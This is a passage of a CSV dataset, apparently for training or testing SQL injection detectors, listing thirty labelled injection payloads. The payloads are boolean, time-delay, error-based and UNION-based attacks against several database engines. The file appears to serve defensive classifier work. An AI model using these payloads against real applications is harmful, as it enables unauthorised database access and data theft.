row_index,payload_norm,label,sqli_type_hint
7020,1'+ ( select myci where 8903 = 8903,1,
7021,1' ) ) and 7533 = 7533 and ( ( 'pagc' like 'pagc,1,
7022,"1 ) as auly where 4146 = 4146 or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,
7023,-2374 ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 2576 = 2576,1,
7024,"1"" waitfor delay '0:0:5'",1,
7025,"1"" ) as ybkp where 7788 = 7788 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",1,
7026,"1 ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( 6312 = 6312",1,
7027,-5313' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 'wkkp' like 'wkkp,1,
7028,"1' ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( 'eiau' = 'eiau",1,
7029,"-7482"" ) ) ) or 9077 = 2651",1,
7030,"-8042 ) as zhoq where 2120 = 2120 union all select 2120,2120,2120,2120,2120,2120,2120,2120,2120,2120--",1,
7031,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",1,
7032,-7452 where 2224 = 2224 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,1,
7033,-8716' ) where 5523 = 5523 or 3686 = 8485--,1,
7034,1' ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( 'vvxk' = 'vvxk,1,
7035,1' ) where 5287 = 5287 and 7533 = 7533--,1,
7036,"select * from generate_series ( 5980,5980,case when ( 5980 = 5063 ) then 1 else 0 end ) limit 1--",1,
7037,-1662 where 1119 = 1119 or ( 8459 = 8459 ) *4906--,1,
7038,"-2046' ) union all select 6668,6668--",1,
7039,1 ) as ywrn where 1893 = 1893,1,
7040,1' and 2316 = 7236,1,
7041,"1"" ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users )",1,
7042,1 ) ) ) and 7533 = 7533 and ( ( ( 7740 = 7740,1,
7043,"1'+ ( select 'pvej' where 4496 = 4496 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) +'",1,
7044,1 ) where 4548 = 4548 and 9198 = 9198--,1,
7045,1 rlike ( select ( case when ( 8314 = 5463 ) then 1 else 0x28 end ) ),1,
7046,"-4807' or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'wwki' = 'wwki",1,
7047,"1'|| ( select 'nbmo' from dual where 5572 = 5572 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
7048,"-3151%"" ) ) ) union all select 6250,6250,6250,6250,6250,6250,6250,6250,6250,6250#",1,
7049,"1'+ ( select 'mtpt' where 7483 = 7483 union all select null,null,null,null,null,null,null,null,null--",1,
